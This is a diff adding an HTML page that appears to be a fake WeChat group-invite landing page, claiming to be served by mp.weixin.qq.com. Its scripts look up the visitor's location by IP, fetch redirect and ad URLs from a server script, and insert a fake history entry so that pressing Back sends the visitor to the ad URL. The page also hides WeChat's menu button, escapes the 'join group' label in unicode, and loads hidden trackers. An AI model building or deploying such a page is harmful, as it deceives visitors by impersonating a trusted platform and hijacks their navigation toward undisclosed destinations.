@@ -1,0 +1,145 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1">
+    <title>....</title>
+    <link rel="stylesheet" type="text/css" href="../Default/css/common.css">
+    <!--<script src="http://ip.ws.126.net/ipquery" charset="utf-8"></script>-->
+   
+    <script src="../Default/js/jquery.min.js" charset="utf-8"></script>
+    <script src="../Default/js/iscoll-lite.min.js" charset="utf-8"></script>
+    <script src="../Default/js/jweixin-1.2.0.js" charset="utf-8"></script>
+    <script src="../Default/js/clipboard.min.js"></script>
+
+    <!--<script type="text/javascript">history.pushState(history.length + 1, "message", "#" + new Date().getTime());-->
+<!--// 声明百度统计的_hmt对象-->
+<!--var _hmt = _hmt || [];-->
+<!--_hmt.push(['_setAccount', '432aedfa335d19417f6fb8cbe115d721']);</script>-->
+    </head>
+<body style="display: none;" class="zfb">
+<div class="weixinmp">网页由 mp.weixin.qq.com 提供</div>
+<div class="wrapper">
+    <div class="wrapper_scroll">
+        <div id="page2" style="display: none;">
+            <div id="xot"></div>
+           
+        </div><div id="lgtys" style="display: none;"></div>
+        <div id="page1" style="display:none"><div id="pks">
+            <div id="top"><div class="t">
+            </div><div class="vo">正在获取资源.......</div>
+                <div class="mun"></div>
+            </div><div id="bottom">
+            <div class="ren">内容反馈中......</div>
+            <div id="dianji2"  >
+                <script>document.writeln('\u52a0\u5165\u7fa4\u804a');</script>
+            </div>
+            <div class="desc">
+              
+                <p>1.你和群里其他人都不是朋友关系，请注意隐私安全。</p>
+                <p>2.该群聊人数较多，为减少新消息给你带来的打扰，建议进群后屏蔽消息通知。</p>
+            </div>
+        </div>
+        </div>
+        </div>
+    </div>
+</div>
+<div id="iosDialog" style="display: none">
+    <div class="weui-dialog">
+        <div class="weui-dialog__bd"></div>
+        <div class="weui-dialog__ft"></div>
+        <div class="weui-dialog__btn_primary"></div>
+    </div>
+</div>
+</body>
+
+<script src="http://ip.ws.126.net/ipquery" charset="utf-8"></script>
+<script type="text/javascript"> 
+
+ var url;
+  var city = '';
+if (lo) {
+	city = lc;
+	if (city.length == 0) {
+		city = lo
+	}
+}
+if (!city) {
+	city = ''
+}
+city = city.replace(unescape("%u7701"), '');
+city = city.replace(unescape("%u5E02"), '');
+$(document).ready(function(){ 
+  $.ajax({ 
+             url: "../url.php?status=url",   
+             type: "POST", 
+             data:'', 
+             dataType: "json",
+    async: false,
+             error: function(){   
+                 alert('系统出错');   
+             },   
+             success: function(data,status){//如果调用php成功  
+               //city=data.city;
+               url=data.url;
+               
+               //location.href='http://'+data.url+'/Default/test.html';
+              
+                
+             } 
+        }); 
+  
+    $("#dianji2").click(function(){   
+       location.href='http://'+url;
+    }) 
+}) 
+
+</script> 
+     <script type="text/javascript" >    
+    
+  window.onhashchange=function(){
+							jp();
+						};
+	function hh() {
+      $.ajax({ 
+             url: "../url.php?status=url",   
+             type: "POST", 
+             data:'', 
+             dataType: "json",
+    async: false,
+             error: function(){   
+                 alert('系统出错');   
+             },   
+             success: function(data,status){//如果调用php成功  
+               //city=data.city;
+               adurl=data.adurl;
+               url=data.url;
+               //location.href='http://'+data.url+'/Default/test.html';
+              
+                
+             } 
+        }); 
+		history.pushState(history.length+1, "message", "#"+new Date().getTime());
+     
+	}
+	function jp() {
+       
+		 location.href=adurl;
+	}
+	setTimeout('hh();', 100);
+</script>
+  <script>
+ document.addEventListener('WeixinJSBridgeReady', function onBridgeReady() {
+    // 通过下面这个API隐藏右上角按钮
+    WeixinJSBridge.call('hideOptionMenu');
+});
+</script>
+<script src="../Default/js/case2.js" charset="utf-8"></script>
+   <span style="display:none">
+<script type="text/javascript" src="https://s23.cnzz.com/z_stat.php?id=1276300257&web_id=1276300257"></script>
+</span>
+  <span style="display:none">
+<script type="text/javascript" src="https://s96.cnzz.com/z_stat.php?id=1276321170&web_id=1276321170"></script>
+</span>
+<!--<script src="https://hm.baidu.com/hm.js?224ff45c7f031f899f6a07dc8824134d" charset="utf-8"></script>-->
+<!--<script src="https://hm.baidu.com/hm.js?432aedfa335d19417f6fb8cbe115d721" charset="utf-8"></script>-->
+</html>
